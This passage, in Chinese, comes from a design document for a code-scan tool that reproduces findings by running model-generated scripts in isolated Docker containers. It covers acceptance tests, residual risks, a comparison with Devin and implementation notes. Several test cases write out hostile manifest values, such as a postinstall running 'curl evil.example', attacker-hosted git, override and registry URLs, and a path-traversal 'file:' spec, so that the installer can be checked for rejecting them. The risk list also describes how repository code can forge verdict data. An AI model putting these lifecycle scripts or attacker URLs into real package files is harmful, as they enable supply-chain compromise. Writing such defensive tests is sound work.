| 20 | 挂载失败明确报错 | 单元级:绕过探测,直接对不存在的路径调一次 docker | `error`(非零)，**不是**静默空目录;端到端跑则探测阶段已停用、记 `notCovered` |
| 21 | 主机无残留 | 完整跑一轮 | `.code-scan` 之外工作区无新增文件;系统临时目录有审计目录 |
| 22 | 探测容器先行 | 镜像未拉取时跑一次 | 探测阶段拉取,不产生 12 条 `error` |
| 23 | 并行扫描容器名不冲突 | 同一工作区同时启两个扫描,各自含 repro | 两个扫描都完成,无容器被对方 `rm -f` 杀掉 |
| 24 | 线性代码不被判成超线性 | 纯 O(n) 函数,`ratio-greater` 给 1.5 | spec 无效(低于 `RATIO_MIN` 2.5)或断言不成立,**不是** `reproduced` |
| 25 | 展示文案带限定语 | 查看任一带 `notReproduced` 的报告 | 文案是「脚本未观察到预期行为」,不含「假阳性」字样 |
| 26 | 依赖能装上并复现 | 一个 import 了 `express` 的发现。**两种导入都要测**:(a) 脚本用 `createRequire('/src/package.json')('express')`;(b) 仓库模块内部 `require('express')` | 两种都能解析;`verdict` 正常 |
| 27 | volume 复用与失败恢复 | (a) 同 repo 连跑两次;(b) 第一次安装中途失败后再跑 | (a) 第二次不重装(有成功标记且 fingerprint 匹配);(b) 第二次**重装**,不复用半成品 |
| 28 | git 依赖被拒 | `package.json` 加 `"x": "git+https://attacker.example/x.git"` | 该仓库全部 `unavailable`,note 含 `unsupported spec in dependencies: x`(与 installer / `MANIFEST_CHECK_CODE` 的文案一致) |
| 29 | file: 协议被拒 | `"x": "file:../../etc"` | 同上 |
| 30 | workspace 被拒 | 有 `pnpm-workspace.yaml` 或 `workspace:*` | 该仓库跳过并记录 |
| 31 | 生命周期脚本被拒 | `"postinstall": "curl evil.example"` | 该仓库跳过并记录,**不装** |
| 32 | 无 lockfile 被拒 | 同时删掉 `package-lock.json` 与 `npm-shrinkwrap.json` | 拒绝安装,记「no lockfile」 |
| 33 | 仓库 `.npmrc` 不被读取 | `.npmrc` 写 `registry=http://evil.example/` | 按 §5.2.2 该仓库直接跳过;若强行进入安装,manifest 暂存目录不含 `.npmrc`,install 仍走 registry.npmjs.org |
| 34 | host `~/.npmrc` 不被读取 | host `~/.npmrc` 配私有 registry,并在容器内 `/tmp/npm-userconfig` 留一个可区分的 canary 配置 | 安装行为符合容器内空配置,而非 host 配置 |
| 35 | 源码在 install 容器里不可见 | install 容器内 `ls /src` 与读一个已知源码文件 | 只有 manifest/lockfile;读源码文件失败(ENOENT) |
| 36 | install 失败不降级 | 故意让 install 失败(如私有包) | 该仓库 `unavailable`,**不**改在 host 或仓库自带 `node_modules` 上跑 |
| 37 | install 容器也有全套隔离 | 检查 install 容器的 `docker inspect` | 非 root、`cap-drop=ALL`、有 pids/memory/cpu 限制、`--rm` |
| 38 | **URL 规格被拒** | `"dependencies": {"x": "https://10.0.0.5:8080/x.tgz"}` | 拒绝(`unsupported spec`),**不发出任何 GET** |
| 39 | **`overrides` 被扫** | `{"overrides": {"ms@2.1.3": "https://attacker/ms.tgz"}}` | 拒绝 |
| 40 | **lockfileVersion 1 被拒** | 把 lockfile 的 `lockfileVersion` 改成 1 | 拒绝(`lockfileVersion not 2/3`) |
| 41 | **缺 integrity 被拒** | 删掉某条目的 `integrity` | 拒绝 |
| 42 | **http: 与非 443 端口被拒** | `resolved` 改 `http://registry.npmjs.org/...` 或加 `:8080` | 拒绝 |
| 43 | **offline 默认零出网** | 默认模式跑一次 install(缓存已预热) | 成功;`docker inspect` 显示 `"NetworkMode": "none"`,且缓存挂载源是 `<home>/.npm`(根)而不是 `_cacache` |
| 44 | **offline 缺包可诊断** | 用一个缓存里没有的依赖 | `unavailable`,note 含「缓存缺包」与 `runtimeVerifyOnline=true` 提示 |
| 45 | **拒绝原因不含凭据** | `"private-git": "git+https://ci:tok3n@github.com/x/y.git"` | note 与审计目录里没有 `tok3n`;只有 key 名 |
| 46 | **体积层级正确** | 装完 express 后跑 repro | `/src/node_modules/express` 存在(不是 `/src/node_modules/node_modules/express`) |
| 47 | **半成品不被复用** | install 中途 kill,再跑一次 | 检测到标记缺失/fingerprint 不匹配 → 重装 |
| 48 | **非 ASCII 仓库名可用** | `repos=[{name:"当前工作区",path:"."}]` | volume 名合法(hex),安装正常 |
| 49 | **镜像内 npm 版本门禁** | 单元级:把 `REPRO_IMAGE_NPM_MAJOR` 改成与镜像不符的值 | 探测阶段停用 → 整体 `notCovered`,不进入 install;不会带着未核对的 npm 语义执行 |

## 12. 残余风险

诚实列出,不掩盖:

1. **模型 + 仓库代码都能影响判定数据的值**。判定(`verdict`)在容器内的固定 `assert.cjs` 里用原始数据计算,主机只读布尔值——这避免了「先脱敏再判定」的两向误差,但没有改变「数据来自被污染的进程」这个事实。v3 把「宣布结果」改成「返回数据、固定规则判定」,挡住了无条件打印标记和退出码伪造。但如果仓库代码 monkey-patch `JSON.stringify` 或 `module.exports`,仍可能让 `run()` 返回伪造数值。**判定含义严格限定为「脚本返回了符合断言的数据」,不是「问题已被独立证明」。** 展示文案用「脚本未观察到预期行为」而不是「假阳性」。
2. **确认框看不到真实脚本**。脚本在运行期生成。缓解:审计目录记录完整 argv、spec 与脱敏输出;文档明写这一点;**确认文案里必须说明「最多 12 段模型生成的脚本将在容器内执行,审计路径见报告」**。
3. **容器隔离弱于 VM**。共享内核,逃逸不在防护范围。
4. **`/src` 可见 `.env`、`.git/config` 等**。缓解:容器内先脱敏再截断(§6.5);`--network=none` 阻止网络外传,但阻止不了报告通道,所以脱敏是必须项。
5. **审计目录含仓库内容片段**。在系统临时目录、不自动清理,用户需自行清理。
6. **判定数据仍可被仓库代码覆写**。harness 是最后写 `/work/result.json` 的正常路径,但仓库代码可以在 `process.on('exit')` 里覆写同一文件。**本设计不承诺不可伪造**(§4.0),只承诺:门槛高于「一句 console.log」、伪造会留痕于审计目录、展示文案标注为脚本自报、永不用于自动裁决。
7. **install 阶段是新的最大攻击面**。**默认 offline(`--network=none`),这是控制点。** 开 `runtimeVerifyOnline=true` 后安装容器可访问任意主机——manifest 检查(五项)只能挡住已知形态,挡不住 arborist 在 `buildIdealTree` 阶段对 URL 规格/`overrides`/v1 lockfile 的重新解析(评审已在 npm 源码里验证这三条绕过)。**报告必须写明本次用的是哪个模式;online 必须显式写「安装容器可访问任意主机」。**
8. **offline 依赖本机缓存**。缓存缺包会 `unavailable`——这是**可操作的降级**,不是缺陷。但它意味着首次使用某个仓库前,建议先在本地跑一次 `npm ci` 预热。
9. **registry 上的合法包本身可能有恶意 `postinstall`**,被 `ignore_scripts` 挡住;但包内容本身有问题(装上、复现时才暴露)不在防护范围。
10. **`--omit=optional` 的代价**。某些包(esbuild、sharp、puppeteer)的 native binding 来自 optional deps;省略后复现可能 `unavailable`。这是有意的取舍:攻击面优先于覆盖率。
11. **`node`/`git` 的裸命令名可被工作区顶替**(§2.2)。既有问题,不在本次范围,但文档不得宣称 host 绝对安全。
12. **首次运行慢**。镜像拉取与 Docker Desktop 冷启动可能各需数十秒;探测阶段用独立超时预算(§8 第 5 步),但首次扫描仍会明显变慢。

## 13. 与 Devin 对照

| | Devin Security Verify | 本设计 |
|---|---|---|
| 触发 | 每条 serious finding,自动 | opt-in + severity 门槛 + 上限 12 |
| 环境 | sandboxed session,"running build" | Docker 容器;v1 两段式安装 npm 依赖 |
| 判定 | Confirmed / False Positive / Inconclusive | reproduced / notReproduced / unavailable / error |
| 判定由谁算 | sandbox 内的验证会话 | 容器内固定 `assert.cjs` 用脚本原始返回值计算,主机只读布尔 |
| 范围 | 安全维度(可利用性) | 质量 / 性能 |
| 隔离 | VM | 容器(弱一档,文档写明) |

**差别在安装的约束强度**:Devin 在一个托管 sandbox 里跑 `npm install`,可以承担较宽的信任;我们默认 **offline**(读本机 npm 缓存,零出网),只有用户显式开 `runtimeVerifyOnline=true` 才联网,并且联网时靠五项 manifest 检查把「不可约束的安装」拒掉。代价是 workspace/monorepo/git 依赖的仓库会整体 `unavailable`;offline 下缓存缺包也会 `unavailable`。

**价值预期**:有了安装,v1 覆盖的是「lockfile 干净、**没有任何生命周期脚本**(含 husky 这类常见的 `prepare`;没有白名单)、依赖来自官方 registry」的 Node 仓库。这类仓库在团队内部很常见,是主要目标。被拒的那几类(git 依赖、workspace 协议、私有 registry)会明确记 `unavailable` 并给出原因,不是静默失败。

## 14. 实现记录(0.7.0)

已实现并合并进 `code-scan/scripts/code-scan.ts`;离线测试在 `test/runtime-verify.test.mjs`(64 条,不需要 Docker)。

### 14.1 与设计稿的差异

| 设计稿 | 实现 | 原因 |
|---|---|---|
| `VOLUME_PREP_CODE` 是 host 片段 | 两次直接 `world.run("docker", ...)` | chown 必须在容器里做,再包一层 node 片段没有意义 |
| 审计只记录脱敏后的输出 | `AUDIT_WRITE_CODE` 对**所有**写入内容先脱敏 | spec/argv 里也可能带出证据中的凭据(验收 #19) |
| `REPRO_IMAGE` 实现时填真实 digest | 常量带占位符 `__REPRO_IMAGE_DIGEST__`;探测阶段解析 tag 的 digest 后**停用并报告该值** | 实现机上 Docker daemon 未运行、Docker Hub 不可达,无法得到可信 digest;硬填一个假值等于把「钉死」变成谎言 |
| `MAX_REPRO` 只按严重度 | high/medium **且** Ground 通过才会被选中 | §10 的 v1 范围 |
| 三个 audit 文件 | 固定名 `spec-<n>.json` / `argv-<n>.json` / `output-<n>.json`,`flag:"wx"`;`REPRO_SPEC_B64` 在 argv 审计里替换成占位符 | §6.1 的固定命名 |

### 14.2 实现里新增的细节

- `DOCKER_GUARD_CODE` 与 `NPM_GUARD_CODE` 分开,只查 `docker`;`dockerBins` 非空只停用运行时复现,不影响 knip/jscpd/madge/ast-grep
- 锁是 `os.tmpdir()` 下的原子 `mkdirSync`(`LOCK_CODE`),跨进程有效;拿不到锁 → 该仓库 `unavailable`,不阻塞其它仓库
- 卷名 = `code-scan-deps-<sha256(仓库标识) 前 20 位>-<fingerprint 前 16 位>`;仓库标识用 `repos` 里用户给的 key,**不用** `package.json#name`
- 容器名 = `code-scan-repro-<AUDIT_ID>-<repoId>-<角色/序号>`;`finally` 里无条件 `docker rm -f`
- 链接遍历只跳过仓库根的 node_modules(它会被只读依赖卷覆盖);嵌套 node_modules 让该仓库整体跳过,否则自带依赖会绕过安装策略;没有 package.json 的仓库用空 tmpfs 覆盖 /src/node_modules
- 每次 docker 调用前重做一次顶替检查;命名容器统一走 callDockerOnce,finally 里无条件 rm -f
- 拿到安装锁后再读一次成功标记:等锁期间别的扫描装好了就复用,不删卷不重装
- lockfile 必须有非空 packages 表(拒绝 v3 标头配 v1 形状:那种 lock 的 resolved 在 dependencies 下,遍历不到);resolved/integrity 必须非空
- 链接遍历在每次 repro 挂载前重做,并带递增 nonce(world.run 按参数缓存,同 argv 的第二次检查会命中第一次的结果);docker 顶替检查同理,image inspect 拉取后用 docker.io/library/<ref> 等价别名做 nonce
- hasManifest 的存在性检查失败按失败处理,不当作「没有 package.json」
- 探测/helper 容器也带 pids/memory/cpus 限制
- 报告新增 `## 运行复现` 段:安装模式、执行条数、审计目录,以及「脚本自报、不是独立证明、永不自动 dismiss」的说明

### 14.3 尚未验证的部分

1. **端到端**:本机 Docker daemon 未运行,探测第 2 步就停用。安装容器、卷挂载、npm 版本门禁、离线缓存挂载都没有真跑过。
2. **镜像 digest**:见 14.1。第一次真正启用时会自停用,并在 `notCovered` 里打印应填的值。
3. **超时路径**:runner 的 52s 超时未实测;`world.run` 超时后的 `docker rm -f` 清理只做了代码审查。
4. **验收 49 条**:能离线跑的部分已在 `test/runtime-verify.test.mjs` 覆盖(片段级、分类表、归一化、去重、redaction、伪造标记、退出码、symlink、manifest 五项、fingerprint);依赖 Docker 的 #9/#10/#11/#13/#14/#20/#22/#23/#43/#46 留到端到端阶段。
